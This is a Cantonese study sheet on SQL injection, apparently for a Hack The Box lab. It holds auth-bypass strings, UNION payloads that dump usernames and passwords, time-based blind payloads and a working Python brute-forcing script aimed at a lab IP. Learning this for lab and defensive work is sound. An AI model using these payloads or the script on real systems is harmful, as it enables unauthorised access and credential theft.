# SQL injection

## <mark style="color:red;">**1. 發現點**</mark>

* 🔎 **搜尋框 (Search Box)**
* 🔗 URL 參數（例子：`example.com/page.php?id=1`）
* 📩 表單提交 (POST 請求)
* 📑 Cookie、HTTP header（有時 header injection 都有驚喜）
* 🛠️ URL fragment（有時候甚至在 hash URL# 後面都可能有 bug）

## <mark style="color:red;">**2. 測試Payload**</mark>

判斷 Error-based or Blind

* **Error-based**：輸入 `'` 有 SQL 錯誤回報
* **Blind**：冇錯誤回報，只係結果唔同
* _Time-based Blind SQLi_ 可以用：

```
' AND sleep(10)-- -
```

睇下反應慢唔慢。

## <mark style="color:red;">3.</mark> <mark style="color:red;"></mark><mark style="color:red;">**繞過身份驗證**</mark>

#### ✅ 1️⃣ **經典 SQLi 認證繞過攻擊流程：**

* 登入時輸入：
  * username：`' OR '1'='1`
  * password：（隨便或空白）
*   執行 SQL：

    ```sql
    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
    ```
* `OR '1'='1'` 會令條件永遠為真 → 成功登入。

***

#### ✅ 2️⃣ **Intruder 自動化爆破建議（Burp）**

* 在 Burp 打開 Intruder
* 設定 Target （指向登入請求）
* 選擇 Payload Position （選 username/password）
* 從 GitHub [Auth\_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt) 複製 payload 清單
* 開始 Attack，觀察回應（HTTP 狀態碼、回應長度或回應字串）
* 如果登入成功，回應可能變長或出現 dashboard 頁面字眼。

***

#### ✅ 3️⃣ **Raw MD5 / SHA1 特別繞過**

> PHP 如果用：

```php
$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

* `md5($password, true)` 會傳回 16 位元 raw binary（有機會產生 null byte 或特殊字元）
* 如果可以控制 `$password`，攻擊者嘗試輸入：
  * 一些 payload 令 binary 結果中出現 `'\` 或 `\x00`，
  * 然後 SQL 語句就會被截斷或繞過。
* 進階 payload 思路（示範）：
  * 找 collision （複雜）
  * 更常見係其他注入路徑（因為 binary injection 比較困難，但存在）
  * 如果系統最後 `base64_encode()` 先傳入 SQL，攻擊者可以 base64 injection。

```
sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b�'";
```

## <mark style="color:red;">4. Union Injection  聯合注射</mark>

#### ✅ **1️⃣ 使用 `ORDER BY` 測試欄位數量**

> 目的：知道 SQL 查詢返回有幾多個欄位

**操作方法：**

*   先嘗試：

    ```
    ' order by 1-- -
    ```

    如果頁面正常，繼續：

    ```
    ' order by 2-- -
    ' order by 3-- -
    ' order by 4-- -
    ```
* 當你試到 `order by X` 個欄位會報錯，就代表 **總欄位數 = X - 1**

> 例子：

* `order by 4` 出錯，代表有 3 個欄位。

#### ✅ **2️⃣ 使用 `UNION SELECT` 測試**

> 目的：找出有幾個欄位可以成功回傳、顯示出你輸入的 payload

**操作方法：**

*   根據上面 `ORDER BY` 找到的欄位數，試：

    ```
    ' UNION SELECT 1,2,3-- -
    ```

    （如果係 3 個欄位）
* 如果成功，頁面會顯示數字 `1`、`2`、`3` 喺輸出位置。
*   如果失敗，就繼續嘗試 4 個欄位：

    ```
    ' UNION SELECT 1,2,3,4-- -
    ```
* 知道有幾多個欄位同埋係邊個位置會顯示內容後，就可以用 `@@version`、`database()` 或 `user()` 代替其中一個位置嚟爆資料：

#### ✅ 3️⃣ **使用** 爆資料 **測試**

1\. 輸出系統信息：

```swift
' UNION SELECT 1,@@version,3-- -
```

2.知道可以讀資料後，開始讀 database name：

```swift
' UNION SELECT 1,database(),3-- -
```

2.然後列出所有 table：

```swift
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
```

2.再列欄位：

```swift
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

3.最後拉出敏感資料：

```swift
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

## <mark style="color:red;">5. Time-based Blind SQLi</mark>

#### 1. 發現盲注漏洞

1️⃣ 找輸入點（通常係登入表單、搜尋框、GET / POST 參數）。\
2️⃣ 測試：

```
' AND SLEEP(3)-- -
```

👉 如果 response 慢 3 秒或以上，就確認係 Time-based Blind SQLi。

***

#### 2. 確認注入上下文

* 試下：

```
admin' AND IF(1=1, SLEEP(3), 0)-- -
```

同

```
admin' AND IF(1=2, SLEEP(3), 0)-- -
```

👉 比較回應時間，慢就代表成功。

***

#### 3. 確定可以利用的 payload 模式

* 基本範例：

```
admin' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=97, SLEEP(3), 0)-- -
```

👉 用來猜第一個字元係唔係 'a' (ASCII 97)。

***

#### 4. 編寫爆破邏輯（或者用 script）

1️⃣ 字符位置用 `SUBSTRING()`\
2️⃣ 字元 ASCII 值用 `ASCII()`\
3️⃣ 比較結果時觸發 `SLEEP(3)`\
範例：

```
IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1))=116, SLEEP(5), 0)
```

* 呢條語句係爆 `table_name` 嘅第一個字元係咪 `t`（ASCII 116）

***

#### 5. 開始爆破順序

1️⃣ 先爆出 **database()**\
2️⃣ 爆出 **所有表名 (information\_schema.tables)**\
3️⃣ 根據表名，爆出 **所有欄位名 (information\_schema.columns)**\
4️⃣ 最後用 LIMIT 一個一個爆資料內容。

***

#### 6. 參考常用 SQLi 爆破模板

| 爆 database 名 | `SELECT database()`                                                                            |
| ------------ | ---------------------------------------------------------------------------------------------- |
| 爆當前 user     | `SELECT user()`                                                                                |
| 爆所有 table    | `SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()` |
| 爆欄位名         | `SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'`    |
| 爆帳號密碼        | `SELECT concat(username,0x3a,password) FROM users`                                             |

***

```python
import requests
import time

url = "http://172.16.16.12/login2.php"  # 目標 URL
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://172.16.16.7/login2.php",
    "Cookie": "cookie1=2fda11d3da11d3ba22d6254e9b7f39af5eab21"  # 可自行修改
}

# 泛用 SQL payload 模板
payload_template = ("admin' AND IF(ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT {row},1)," 
                    "{{position}},1))={{char}}, SLEEP(5), 0)-- -")

column = "user"   # 要爆嘅欄位名
table = "user"    # 要爆嘅表名
row = 0           # LIMIT 從第幾行開始

username = ""  # 儲存結果

# 如果 output.txt 存在，從檔案續爆
try:
    with open("output.txt", "r") as f:
        username = f.read().strip()
        print(f"[+] 從檔案恢復進度: {username}")
except FileNotFoundError:
    pass

for position in range(len(username) + 1, 100):  # 從上次中斷位置繼續
    for char in range(32, 127):  # ASCII 可見字元
        payload = payload_template.format(column=column, table=table, row=row).replace("{position}", str(position)).replace("{char}", str(char))
        data = {"user": payload, "password": "test", "s": "OK"}

        start_time = time.time()
        response = requests.post(url, headers=headers, data=data)
        end_time = time.time()

        if end_time - start_time > 3:  # 如果超過 3 秒表示猜對
            username += chr(char)
            print(f"[+] 找到字元: {chr(char)} at position {position}")

            # 寫入 output.txt 保存進度
            with open("output.txt", "w") as f:
                f.write(username)
            break
    else:
        print("[!] 爆破結束或遇到不可見字元")
        break

print(f"[+] 爆破完成，結果：{username}")

```

#### 【第七步】避免出錯小提醒

* `-- -` 後面有空格
* 判斷 `LIMIT` 記得慢慢試 0,1 / 1,1 / 2,1
* response time 超過 3 秒就代表成功
* 太慢可以用二分法爆破 (binary search)，但初期練習建議 ASCII 順序試。

## <mark style="color:red;">6.Skills Assessment</mark>

{% embed url="https://academy.hackthebox.com/module/33/section/518" %}

{% embed url="https://www.youtube.com/watch?v=z5pdizHDvt8&list=PLidcsTyj9JXItWpbRtTg6aDEj10_F17x5&index=2&t=2s" %}

[https://www.youtube.com/watch?v=V\_CkT7xyiCc\&list=PLidcsTyj9JXItWpbRtTg6aDEj10\_F17x5\&index=3](https://www.youtube.com/watch?v=V_CkT7xyiCc\&list=PLidcsTyj9JXItWpbRtTg6aDEj10_F17x5\&index=3)
